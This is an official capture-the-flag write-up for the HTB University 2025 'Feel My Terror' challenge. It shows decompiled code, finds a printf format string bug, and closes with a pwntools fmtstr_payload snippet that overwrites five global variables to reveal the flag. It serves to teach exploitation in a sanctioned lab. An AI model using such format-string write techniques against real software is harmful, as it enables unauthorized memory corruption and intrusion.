# htb-university-2025_Feel My Terror

![](../../assets/banner.png)



<img src="../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	    <font size="6">Feel My Terror</font>

​		11<sup>th</sup> November 2025 

​		Prepared By: w3th4nds

​		Challenge Author(s): w3th4nds

​		Difficulty: <font color=green>Easy</font>

​		Classification: Official

 





# Synopsis

Feel My Terror is an easy difficulty challenge that features format string vulnerability to overwrite 5 values using the fmtstr_payload from pwntools.

# Description

These mischievous elves have scrambled the good kids’ addresses! Now the presents can’t find their way home. Please help me fix them quickly — I can’t sort this out on my own.

## Skills Required

- Basic C.

## Skills Learned

- format string vulnerability via pwntools.

# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
Arch:       amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

### Protections 🛡️

As we can see:

| Protection | Enabled  | Usage   |
| :---:      | :---:    | :---:   |
| **Canary** | ✅      | Prevents **Buffer Overflows**  |
| **NX**     | ✅       | Disables **code execution** on stack |
| **PIE**    | ❌       | Randomizes the **base address** of the binary |
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

The program's interface 

![](assets/inter.png)

There is an obvious `format string vulnerability` here. Let's head into the decompiler to see what happens.

### Disassembly

Starting with `main()`:

```c
00401b79  int32_t main(int32_t argc, char** argv, char** envp)

00401b79  {
00401b88      void* fsbase;
00401b88      int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
00401b97      banner();
00401b9c      randomizer();
00401ba1      int64_t buffer;
00401ba1      __builtin_memset(&buffer, 0, 0xc6);
00401c87      arg5;
00401c8d      arg4;
00401c93      arg3;
00401c99      arg2;
00401c9f      arg1;
00401cbc      info("Look at the mess the ELVES made:…", 0);
00401cd0      info("Please fix the addresses to help…", 0);
00401ce9      read(0, &buffer, 0xc5);
00401cfd      info("I hope the addresses you gave me…", 0);
00401d11      printf(&buffer);
00401d20      fflush(__TMC_END__);
00401d34      info("Checking the database...\n", 0);
00401d39      check_db();
00401d47      *(uint64_t*)((char*)fsbase + 0x28);
00401d47      
00401d50      if (rax == *(uint64_t*)((char*)fsbase + 0x28))
00401d58          return 0;
00401d58      
00401d52      __stack_chk_fail();
00401d52      /* no return */
00401b79  }
```

The key points here are:

* There is a `randomizer()` function.
* There are some global variables `arg1`...`arg5`.
* There is a `check_db()` function.

Taking a look at `randomizer()`:

```c
00401949  int64_t randomizer()

00401949  {
00401955      void* fsbase;
00401955      int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
00401970      srand(time(nullptr));
00401975      int32_t rax_3 = rand();
00401981      uint32_t rax_6 = ((rax_3 >> 0x1f) >> 4);
00401993      arg1 = ((((rax_3 + rax_6) & 0xfffffff) - rax_6) + 1);
00401999      int32_t rax_9 = rand();
004019a5      uint32_t rax_12 = ((rax_9 >> 0x1f) >> 4);
004019b7      arg2 = ((((rax_9 + rax_12) & 0xfffffff) - rax_12) + 1);
004019bd      int32_t rax_15 = rand();
004019c9      uint32_t rax_18 = ((rax_15 >> 0x1f) >> 4);
004019db      arg3 = ((((rax_15 + rax_18) & 0xfffffff) - rax_18) + 1);
004019e1      int32_t rax_21 = rand();
004019ed      uint32_t rax_24 = ((rax_21 >> 0x1f) >> 4);
004019ff      arg4 = ((((rax_21 + rax_24) & 0xfffffff) - rax_24) + 1);
00401a05      int32_t rax_27 = rand();
00401a11      uint32_t rax_30 = ((rax_27 >> 0x1f) >> 4);
00401a23      arg5 = ((((rax_27 + rax_30) & 0xfffffff) - rax_30) + 1);
00401a23      
00401a37      if (rax == *(uint64_t*)((char*)fsbase + 0x28))
00401a3f          return (rax - *(uint64_t*)((char*)fsbase + 0x28));
00401a3f      
00401a39      __stack_chk_fail();
00401a39      /* no return */
00401949  }
```

Nothing special, just gives random values to the `args`.

Diving into `check_db()`:

```c
00401a40  int64_t check_db()

00401a40  {
00401a4c      void* fsbase;
00401a4c      int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
00401a5b      int64_t var_48;
00401a5b      __builtin_memset(&var_48, 0, 0x30);
00401a9f      int32_t fd = open("./flag.txt", 0);
00401a9f      
00401aab      if (fd == 0xffffffff)
00401aab      {
00401abc          fail("If you run this locally, create …", 0);
00401abc          /* no return */
00401aab      }
00401aab      
00401ad2      read(fd, &var_48, 0x2f);
00401ad2      
00401b16      if ((arg1 != 0xdeadbeef || (arg2 != 0x1337c0de || (arg3 != 0xf337babe || (arg4 != 0x1337f337 || arg5 != 0xfadeeeed)))))
00401b16      {
00401b53          fail("All people do is LIE!\n", 0);
00401b53          /* no return */
00401b16      }
00401b16      
00401b27      success("Thanks a lot my friend <3. Take …", 0);
00401b33      puts(&var_48);
00401b3d      close(fd);
00401b3d      
00401b70      if (rax == *(uint64_t*)((char*)fsbase + 0x28))
00401b78          return (rax - *(uint64_t*)((char*)fsbase + 0x28));
00401b78      
00401b72      __stack_chk_fail();
00401b72      /* no return */
00401a40  }
```

Now this is interesting. We see that it opens `flag.txt` and then checks if the `args` contain some certain addresses. If so, then it prints the flag, otherwise it exits with a message.

#### Exploitation path

What we have so far:

* Some global variables (known addresses, there is no `PIE`)
* A `format string vulnerability`.
* A function that prints the flag if the `args` are correct.

Our goal:

* Find the offset where we write with the `fmt` bug.
* Overwrite the addresses of the `args` with the correct values.

The offset can be found at index 6 in the screenshot below.

![](assets/fmt.png)

There is no point in doing this manually, it will be true pain, so I'm going to use pwntools `fmtstr_payload` to craft my payload.

# Solution

```python
writes = { 
  e.sym.arg1: 0xdeadbeef,
  e.sym.arg2: 0x1337c0de,
  e.sym.arg3: 0xf337babe,
  e.sym.arg4: 0x1337f337,
  e.sym.arg5: 0xfadeeeed 
}

r.sendline(fmtstr_payload(6, writes, write_size='short'))
```

